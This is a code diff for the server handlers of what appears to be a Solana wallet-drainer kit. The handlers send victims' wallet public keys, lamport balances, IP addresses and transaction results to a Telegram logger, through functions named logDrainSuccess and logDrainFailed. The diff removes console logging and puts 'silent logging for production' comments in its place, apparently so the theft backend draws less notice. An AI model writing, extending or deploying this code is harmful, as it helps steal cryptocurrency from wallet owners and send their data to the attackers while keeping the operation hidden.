@@ -39,8 +39,7 @@ export default async function handler(req, res) {
 // Wallet logging handler
 async function handleWalletLogging(req, res) {
   try {
-    console.log('[SERVER] Received request body:', req.body);
-    console.log('[SERVER] Request headers:', req.headers);
+    // Silent request logging for production
     
     const { publicKey, walletType, origin, userAgent, lamports } = req.body;
     const userIp = req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown';
@@ -51,12 +50,7 @@ async function handleWalletLogging(req, res) {
       return res.status(400).json({ error: 'Missing publicKey' });
     }
     
-    console.log('[SERVER] Received wallet log request:', {
-      publicKey: publicKey,
-      walletType: walletType,
-      lamports: lamports,
-      ip: userIp
-    });
+    // Silent wallet logging for production
     
     // Import and use Telegram logging
     try {
@@ -70,15 +64,10 @@ async function handleWalletLogging(req, res) {
     } catch (telegramError) {
       console.error('[TELEGRAM] Failed to log wallet detection:', telegramError);
       // Fallback to console logging
-      console.log('[WALLET_LOG] Wallet detected:', {
-        publicKey: publicKey,
-        walletType: walletType || 'Unknown',
-        lamports: lamports || 0,
-        ip: userIp
-      });
+      // Silent fallback logging for production
     }
     
-    console.log('[SERVER] Wallet logging successful');
+    // Silent success logging for production
     res.status(200).json({ success: true });
   } catch (error) {
     console.error('[SERVER] Error logging wallet connection:', error);
@@ -89,12 +78,12 @@ async function handleWalletLogging(req, res) {
 // Confirmation logging handler
 async function handleConfirmationLogging(req, res) {
   try {
-    console.log('[CONFIRMATION] Received confirmation request:', req.body);
+    // Silent confirmation logging for production
     const { publicKey, txid, status, error } = req.body;
     const userIp = req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown';
     
     if (status === 'confirmed' || status === 'finalized' || status === 'processed' || status === 'broadcast_success') {
-      console.log('[CONFIRMATION] Logging successful confirmation for:', publicKey, txid, 'status:', status);
+      // Silent success confirmation logging for production
       try {
         const telegramLogger = (await import('../src/telegram.js')).default;
         await telegramLogger.logDrainSuccess({
@@ -106,15 +95,10 @@ async function handleConfirmationLogging(req, res) {
         });
       } catch (telegramError) {
         console.error('[TELEGRAM] Failed to log drain success:', telegramError);
-        console.log('[DRAIN_SUCCESS] Transaction successful:', {
-          publicKey: publicKey,
-          txid: txid,
-          status: status,
-          ip: userIp
-        });
+        // Silent drain success logging for production
       }
     } else if (error) {
-      console.log('[CONFIRMATION] Logging failed confirmation for:', publicKey, txid, error);
+              // Silent failed confirmation logging for production
       try {
         const telegramLogger = (await import('../src/telegram.js')).default;
         await telegramLogger.logDrainFailed({
@@ -126,18 +110,13 @@ async function handleConfirmationLogging(req, res) {
         });
       } catch (telegramError) {
         console.error('[TELEGRAM] Failed to log drain failed:', telegramError);
-        console.log('[DRAIN_FAILED] Transaction failed:', {
-          publicKey: publicKey,
-          txid: txid,
-          error: error,
-          ip: userIp
-        });
+        // Silent drain failed logging for production
       }
     } else {
-      console.log('[CONFIRMATION] Unknown status:', status, 'for:', publicKey, txid);
+              // Silent unknown status logging for production
     }
     
-    console.log('[CONFIRMATION] Confirmation logged successfully');
+    // Silent confirmation success logging for production
     res.status(200).json({ success: true });
   } catch (error) {
     console.error('[CONFIRMATION] Error logging confirmation:', error);
@@ -148,7 +127,7 @@ async function handleConfirmationLogging(req, res) {
 // Cancellation logging handler
 async function handleCancellationLogging(req, res) {
   try {
-    console.log('[CANCELLATION] Received cancellation request:', req.body);
+    // Silent cancellation logging for production
     const { publicKey, walletType, reason } = req.body;
     const userIp = req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown';
     
@@ -157,21 +136,16 @@ async function handleCancellationLogging(req, res) {
       await telegramLogger.logTransactionCancelled({
         publicKey: publicKey,
         walletType: walletType || 'Unknown',
-        reason: reason || 'User cancelled transaction',
+        reason: reason || 'User canceled the transaction',
         ip: userIp,
         lamports: req.body.lamports || 0
       });
     } catch (telegramError) {
       console.error('[TELEGRAM] Failed to log cancellation:', telegramError);
-      console.log('[CANCELLATION] Transaction cancelled:', {
-        publicKey: publicKey,
-        walletType: walletType || 'Unknown',
-        reason: reason || 'User cancelled transaction',
-        ip: userIp
-      });
+      // Silent cancellation details logging for production
     }
     
-    console.log('[CANCELLATION] Cancellation logged successfully');
+    // Silent cancellation success logging for production
     res.status(200).json({ success: true });
   } catch (error) {
     console.error('[CANCELLATION] Error logging cancellation:', error);
